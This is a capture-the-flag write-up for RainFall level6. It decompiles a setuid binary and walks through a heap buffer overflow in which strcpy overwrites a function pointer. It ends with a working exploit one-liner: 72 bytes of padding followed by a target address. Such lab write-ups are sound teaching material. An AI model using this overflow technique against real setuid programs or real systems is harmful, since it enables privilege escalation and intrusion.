```
level6@RainFall:~$ ll
total 17
dr-xr-x---+ 1 level6 level6   80 Mar  6  2016 ./
dr-x--x--x  1 root   root    340 Sep 23  2015 ../
-rw-r--r--  1 level6 level6  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level6 level6 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level7 users  5274 Mar  6  2016 level6*
-rw-r--r--+ 1 level6 level6   65 Sep 23  2015 .pass
-rw-r--r--  1 level6 level6  675 Apr  3  2012 .profile
```
let's decompile it now
```
void main(undefined4 placeholder_0, char **argv)
{
    undefined4 uVar1;
    code **ppcVar2;
    char *src;
    void *var_ch;
    char *dest;
    
    uVar1 = malloc(0x40);
    ppcVar2 = (code **)malloc(4);
    *ppcVar2 = m;
    strcpy(uVar1, argv[1]);
    (**ppcVar2)();
    return;
}
```
So what do we see ?
we see, a malloc of size 64, plus one of size 4.
and then we see that the second malloc is executed as a function. nice.
What is the size of the malloc ?
64 + 2 times pointer size, a pointer in 32x is 4 not 8
so the total size is 72.
let's try something, (don't forget it's in the argv)
```
level6@RainFall:~$ ./level6 $(python -c "print 'b' * 72 + '\x54\x84\x04\x08'")
<hidden>
```
